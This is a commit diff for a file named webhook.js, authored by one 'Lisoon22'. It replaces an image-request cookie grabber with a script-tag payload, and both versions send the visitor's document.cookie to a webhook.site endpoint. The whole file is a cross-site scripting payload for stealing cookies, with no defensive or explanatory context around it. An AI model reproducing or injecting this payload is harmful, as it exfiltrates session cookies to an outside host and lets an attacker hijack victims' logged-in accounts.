4c7a5e8df423fc48e6d4a720828a70d3f4920f58
Lisoon22 <roman.voronin.2006@mail.ru>
2026-07-26 23:13:35 +0300

    Update webhook.js

--- webhook.js
+++ webhook.js
@@ -1,1 +1,7 @@
-x = new Image(); x.src = 'https://webhook.site/fb14196f-4856-4f8f-b327-0ac51ba9aaad?data='+btoa(document.cookie);
+<script>
+fetch('https://webhook.site/fb14196f-4856-4f8f-b327-0ac51ba9aaad', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
